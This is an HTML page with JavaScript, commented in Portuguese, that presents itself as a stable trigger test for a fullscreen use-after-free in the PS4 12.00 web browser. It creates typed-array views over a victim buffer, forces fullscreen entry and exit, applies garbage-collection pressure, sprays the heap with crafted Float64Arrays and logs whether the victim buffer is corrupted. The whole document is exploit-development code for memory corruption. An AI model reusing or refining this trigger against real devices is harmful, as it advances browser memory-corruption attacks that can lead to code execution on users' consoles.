<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Fullscreen UAF - Stable Trigger Test</title>
</head>
<body>

<h2>PS4 12.00 - Fullscreen UAF (Teste 4 Expandido)</h2>

<button onclick="run()">Run Test</button>

<pre id="log" style="background:#111;color:#0f0;padding:10px;height:400px;overflow:auto;"></pre>

<script>
function log(msg) {
    document.getElementById("log").textContent += msg + "\n";
}

let f64, u32, dv;
let victimBuffer;

function run() {
    log("[*] Iniciando teste...");

    // =========================
    // Criar objetos críticos
    // =========================
    victimBuffer = new ArrayBuffer(0x100);
    f64 = new Float64Array(victimBuffer);
    u32 = new Uint32Array(victimBuffer);
    dv  = new DataView(victimBuffer);

    f64[0] = 13.37;
    u32[2] = 0x1337;
    dv.setUint32(16, 0xdeadbeef, true);

    log("[+] Objetos criados");

    // =========================
    // Fullscreen
    // =========================
    document.documentElement.webkitRequestFullscreen?.();

    // =========================
    // Eventos críticos
    // =========================
    document.addEventListener("visibilitychange", () => {
        log("[EVENT] visibilitychange: " + document.visibilityState);
    });

    document.addEventListener("fullscreenchange", () => {
        log("[EVENT] fullscreenchange fired");

        // 🔥 PONTO CRÍTICO
        setTimeout(() => {
            log("[*] Forçando saída fullscreen...");
            document.webkitExitFullscreen?.();
        }, 50);
    });

    window.onblur = function() {
        log("[EVENT] onblur recebido");

        // =========================
        // GC leve
        // =========================
        for (let i = 0; i < 5000; i++) {
            new ArrayBuffer(0x1000);
        }

        log("[*] GC leve executado");

        // =========================
        // Heap spray leve
        // =========================
        let spray = [];
        for (let i = 0; i < 2000; i++) {
            let arr = new Float64Array(16);
            arr.fill(2.121995791e-314);
            spray.push(arr);
        }

        log("[*] Spray leve executado");

        // =========================
        // CHECK PRÉ-CRASH
        // =========================
        try {
            log("---- CHECK PRÉ-EXIT ----");
            log("[F64] " + f64[0]);
            log("[U32] " + u32[2]);
            log("[DV] " + dv.getUint32(16, true));
            log("[META] len=" + f64.length + " byteLength=" + f64.byteLength);
        } catch (e) {
            log("[ERRO CHECK] " + e);
        }
    };
}
</script>

</body>
</html>
